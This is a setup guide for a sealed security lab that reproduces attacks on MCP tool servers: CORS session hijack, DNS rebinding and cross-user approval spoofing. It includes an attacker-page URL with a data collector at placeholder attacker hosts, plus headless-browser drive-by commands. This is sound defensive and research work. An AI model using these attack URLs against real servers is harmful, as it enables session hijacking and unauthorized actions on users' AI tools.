# Getting started (on the VM only)

> Everything here runs **only** on the isolated test VM. The authoring host edits code and runs the
> offline gates (`./range check`, `./range typecheck`, `./range plan`) - never a live server.

Everything the range can do is a subcommand of the single `./range` executable at the repo root.
`./range --help` lists them all and marks each one `[dev]` (offline, safe on the authoring host) or
`[VM]` (lab VM only).

## 0. Identify the VM (once)
A `[VM]` command refuses to run unless the host has positively identified itself as the lab VM, so an
unmarked host fails closed. Mark the VM once, persistently:
```bash
sudo touch /etc/meridian-vm                         # on the lab VM only
```
Or set `MERIDIAN_ON_VM=1` for a single command. The examples below assume the marker file is in place.
The attacker side of a split-host test is acknowledged separately with `MERIDIAN_ATTACKER_HOST=1`.

## 1. Sync the code to the VM
From the authoring host:
```bash
export LAB_VM=ai@192.0.2.10      # where to push; deliberately not committed, so no real address is in the repo
./range sync                     # rsync this repo to ~/meridian-range/ on the VM
./range sync --build 01          # ... and rebuild module 01's server there afterwards
```

## 2. Pre-flight (on the VM)
```bash
cd ~/meridian-range
./range list                                        # modules on disk, and the tiers each one supports
ss -tlnp | grep -v ':22 '                           # no lab port on 0.0.0.0
```
The sealed tier needs no `.env` at all: a module's own scenario targets live in its committed
`modules/<NN-slug>/lab.env` (labnet-internal aliases, not secrets), which that module's `compose.yml`
loads into the harness. The repo-root `.env` holds only deployment-specific values (published ports,
public hostnames, host IPs, Traefik knobs), so `cp .env.example .env` matters only for the opt-in
exposed tiers.

## 3. Bring the range up (sealed tier, the vulnerable default)
```bash
./range up 01 --tier sealed
docker network inspect meridian-range_labnet -f '{{.Internal}}'    # must print: true
./range status                                      # what is deployed here right now
```
There is no root compose file to bring up by hand. The sealed **base** (`engine/compose.yml`: the
network, the shared telemetry volume, the attacker infra and the harness) is merged with that module's
own `modules/<NN-slug>/compose.yml`, and `./range up` is what assembles the `-f` chain. `./range plan
01 --tier sealed` prints the exact `docker compose` command it would run without starting anything,
which is the authoring-host-safe way to inspect a tier.

`sealed` publishes no port and needs no DNS. Only **one** module may be deployed at a time.
`./range up` refuses if another module's stack is running, and
`./range down` clears whatever is up on the current host.

## 4. Run the scenarios (`ok = attack succeeded`)

Vulnerable default:
```bash
./range run 01     # module 01 (CORS, no DNS) → [ATTACK-OK]
./range run 02     # module 02 (DNS rebind)   → [ATTACK-OK]
./range run 03     # module 03 (ghost approval)  → expected [ATTACK-OK], VM verification pending
```

- **`[ATTACK-OK]`** = the vulnerable default reproduced (module 01: wildcard CORS; module 02: no Host check
  on the post-rebind request; module 03: Bob answered the elicitation for Alice's protected action).
- **`[NO-REPRO]`** = the scenario did not reproduce (for example, the foreign origin or Host was
  refused, or module 03's second transport attachment was rejected).

`./range run` rebuilds the harness image first, so the VM can never execute stale scenario code. The
definition-of-done gate is `./range verify <module>`, which asserts ATTACK-OK and has the **harness**
write the evidence capture to `modules/<NN-slug>/evidence/vuln.txt` on the VM. Bring those captures
back to the authoring host to commit with `./range sync --pull-evidence`.

`./range matrix <module>` re-runs a module against every SDK version and mitigation flag its `module.yml`
declares, producing the affected-versus-patched grid from actual runs rather than from a claim.

## 5. (optional) real-browser drive-by (module 01)
```bash
docker compose --project-directory . -f engine/compose.yml \
  -f modules/01-cors-session-hijack/compose.yml --profile browser up browser   # headless Chromium opens attacker.lab.consulereit.nl
docker compose -p meridian-range logs attacker-collector                       # the canary output lands here
```

Module 01 also has a manual cross-machine test (no DNS), via its exposed tiers:

```bash
# split-host (recommended): attacker infra off the victim box
MERIDIAN_ATTACKER_HOST=1 ./range up 01 --tier split-host --side attacker   # attacker host
./range up 01 --tier split-host --side victim                              # lab VM

# single-host convenience: all three on the VM
./range up 01 --tier single-host
```

The attacker page takes explicit targets. The **primary** split-host example is
`http://<ATTACKER_IP>:1337/lan.html?mcp=http://<VICTIM_IP>:8080&collector=http://<ATTACKER_IP>:9000/pwned`.
The single-host tier uses `?samehost=1` instead; stable-DNS mode passes fixed-record targets. See the
README "Manual cross-machine test" and [`topology.md`](./topology.md).

## 5a. (optional) subdomains via your Traefik / wildcard DNS
Prefer clean HTTPS subdomains over raw `IP:port`? Bring up either exposed tier (above), set the Traefik
knobs in `.env`, generate the router config, and drop it into your existing Traefik (file/dynamic provider,
reaching each backend by `IP:port` - the same convention as the lab's Forgejo):
```bash
./range traefik 01 > meridian-range.yml   # static; reads the module manifests + .env, no VM/Docker needed
# copy meridian-range.yml into your Traefik dynamic-config dir, then browse:
#   https://attacker.lab.consulereit.nl/lan.html?mcp=https://mcp.lab.consulereit.nl&collector=https://collector.lab.consulereit.nl/pwned
```
The routers are **role**-named (`mr-mcp` / `mr-hacker` / `mr-collector`), so this one file serves whichever
module is currently deployed and a wildcard `*.lab.consulereit.nl` record covers every name. Full
walkthrough, TLS/SSE notes, and the safety trade-off: [`traefik.md`](./traefik.md). No DNS? Skip this and
use the raw `IP:port` path in step 5.

## 5b. (optional) live DNS rebind (module 02)
The **only** module that needs DNS, and `split-host` **only** (no single-host tier: both sides must
publish the same port, which one host cannot bind twice):

```bash
MERIDIAN_ATTACKER_HOST=1 ./range up 02 --tier split-host --side attacker   # attacker VM
./range up 02 --tier split-host --side victim                              # victim VM
```

It uses your **existing** lab Technitium on an isolated lab LAN (no bundled DNS server by default), and it
is deliberately **not** Traefik-routable: the flip must happen in the DNS answer, so `./range traefik 02`
refuses. The record, short TTL, initial/final answers, browser-resolver notes, the flip, restore, and
teardown are documented in
[`../modules/02-dns-rebind/README.md`](../modules/02-dns-rebind/README.md). The sealed tier stays DNS-free.

## 6. Tear down
```bash
./range down        # removes every meridian-range stack on this host, any tier
./range status      # confirm: nothing deployed
```
Run it on **each** host that was part of the deployment (the attacker host needs
`MERIDIAN_ATTACKER_HOST=1` instead). If a Traefik router config was in play, delete that file too, and
revert any lab DNS record you created.

The opt-in `browser` / `fixed` / `tools` profiles are part of the sealed project, so `./range down`
removes them along with everything else.

## Detections
Each module carries its own, next to the scenario that produces the signal:
- Machine-readable rules + test cases: `modules/<NN-slug>/detection/*.yaml`, evaluated by
  `./range detect-test`.
- Elastic prose rule: `modules/<NN-slug>/detection/elastic.md`; the shared telemetry contract is
  [`telemetry-contract.md`](./telemetry-contract.md).
- `./range export --format sigma|elastic` writes the whole set out as a portable pack.

Author detection rules **disabled** and scope them to the lab host so they can never fire elsewhere.

## Other commands worth knowing
- `./range new 04 tool-poisoning` scaffolds a module directory from `modules/_template/`; the catalog is
  a glob over `modules/*/module.yml`, so adding a module means adding a directory and nothing else.
- `./range check` runs the offline gates (manifest, structure, topology, detections, safety) and
  `./range render` regenerates the module-derived tables in the docs.
- `./range probe` runs a module's **read-only** checks against a target you own: it observes the
  transport response and never drives a capability tool. It requires `--i-am-authorized` and refuses a
  non-private target by default.
